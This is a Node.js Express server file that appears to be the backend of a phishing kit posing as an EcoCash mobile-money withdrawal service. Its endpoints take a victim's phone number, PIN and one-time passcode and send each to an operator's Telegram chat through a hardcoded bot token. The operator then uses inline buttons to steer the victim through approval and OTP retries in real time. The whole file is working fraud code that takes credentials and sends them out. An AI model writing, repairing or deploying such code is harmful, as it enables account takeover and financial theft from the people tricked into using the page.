require('dotenv').config();
const express = require('express');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '8727965029:AAEyRJ62jFfxCquacI6nFF5uNMPFhxawGtk';
const CHAT_ID = 8807339828;

let withdrawalStatus = 'idle'; 
let otpStatus = 'idle';        
let lastUpdateId = 0;

// 1. Receive Withdrawal Request from Frontend & Send to Telegram
app.post('/api/withdrawal', async (req, res) => {
    const { phone, amount, pin } = req.body;
    withdrawalStatus = 'pending';
    otpStatus = 'idle';

    const message = `🚨 *New EcoCash Withdrawal Request* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`$${amount}\`\n🔑 *PIN:* \`${pin}\``;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Approve Withdrawal', callback_data: 'approve_withdrawal' },
                            { text: '❌ Decline', callback_data: 'reject_withdrawal' }
                        ]
                    ]
                }
            })
        });

        const data = await response.json();
        if (!data.ok) {
            console.error('Telegram Error:', data);
            return res.status(500).json({ error: 'Failed to send telegram message' });
        }

        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Server error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Check withdrawal approval status
app.get('/api/check-withdrawal-status', (req, res) => {
    res.json({ status: withdrawalStatus });
});

// 2. Receive OTP from Frontend & Send to Telegram for Verification
app.post('/api/verify-otp', async (req, res) => {
    const { otp } = req.body;
    otpStatus = 'pending';

    const message = `🔐 *EcoCash OTP Code Submitted* 🔐\n\n🔢 *OTP:* \`${otp}\``;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Correct OTP', callback_data: 'correct_otp' },
                            { text: '❌ Wrong OTP', callback_data: 'wrong_otp' }
                        ]
                    ]
                }
            })
        });

        res.json({ status: 'pending' });
    } catch (err) {
        console.error('OTP send error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Check OTP verification status
app.get('/api/check-otp-status', (req, res) => {
    res.json({ status: otpStatus });
});

// 3. Telegram Long Polling to listen for Admin button clicks
async function pollTelegramUpdates() {
    if (!BOT_TOKEN) return;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.ok && data.result && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const action = update.callback_query.data;
                    const chatId = update.callback_query.message.chat.id;
                    const messageId = update.callback_query.message.message_id;
                    const callbackQueryId = update.callback_query.id;

                    await answerCallback(callbackQueryId, 'Processing action...');

                    // 1. Remove buttons from original message so it can't be clicked twice, leaving details fully visible
                    await removeMessageButtons(chatId, messageId);

                    // 2. Send status confirmation right underneath
                    let statusMessage = '';
                    if (action === 'approve_withdrawal') {
                        withdrawalStatus = 'approved';
                        statusMessage = '✅ *Status: Withdrawal Approved by Admin*';
                    } else if (action === 'reject_withdrawal') {
                        withdrawalStatus = 'rejected';
                        statusMessage = '❌ *Status: Withdrawal Declined by Admin*';
                    } else if (action === 'correct_otp') {
                        otpStatus = 'success';
                        statusMessage = '✅ *Status: OTP Verified - Success*';
                    } else if (action === 'wrong_otp') {
                        otpStatus = 'wrong';
                        statusMessage = '❌ *Status: Wrong OTP - Retrying*';
                    }

                    if (statusMessage) {
                        await sendStatusMessage(chatId, statusMessage);
                    }
                }
            }
        }
    } catch (err) {
        console.error('Polling error:', err.message);
    }

    setTimeout(pollTelegramUpdates, 1000);
}

async function answerCallback(callbackQueryId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text })
        });
    } catch (e) {
        console.error('Answer callback error:', e);
    }
}

async function removeMessageButtons(chatId, messageId) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                message_id: messageId, 
                reply_markup: { inline_keyboard: [] } 
            })
        });
    } catch (e) {
        console.error('Remove buttons error:', e);
    }
}

async function sendStatusMessage(chatId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: text, 
                parse_mode: 'Markdown' 
            })
        });
    } catch (e) {
        console.error('Send status message error:', e);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running successfully on port ${PORT}`);
    pollTelegramUpdates();
});